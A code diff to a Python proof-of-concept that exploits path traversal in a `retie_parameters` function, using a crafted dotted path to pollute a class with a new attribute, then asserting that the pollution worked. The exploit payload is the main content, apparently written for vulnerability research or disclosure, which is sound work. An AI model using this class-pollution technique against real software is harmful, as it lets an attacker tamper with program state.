@@ -13,24 +13,19 @@ class MockModel:
 
 model = MockModel()
 model.target = target
-# Create a non-meta tensor that will be used as the "tied" value
 model.pwnd = torch.tensor([0.0])
 
 payload_value = model.pwnd
-# retie_parameters: for each tied group, finds first non-meta param, then
-# setattr's all other paths to that same object
-# Path traversal: splits on ".", getattr to parent, setattr leaf
-PAYLOAD = [["pwnd", "target.__class__.__name__"]]
+PAYLOAD = [["pwnd", "target.__class__.polluted"]]
 
 def run_poc():
   retie_parameters(model, PAYLOAD)
 
 def verify_poc():
-  original_name = target.__class__.__name__
-  assert original_name == "Target", "Pre-condition failed"
+  assert not hasattr(Target, "polluted"), "Pre-condition failed"
   run_poc()
-  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
-  assert target.__class__.__name__ != "Target", "Class pollution failed!"
+  print(f"After: Target.polluted = {Target.polluted}")
+  assert hasattr(Target, "polluted"), "Class pollution failed!"
   print("[Pass] Class pollution PoC verified!")
 
 if __name__ == "__main__":
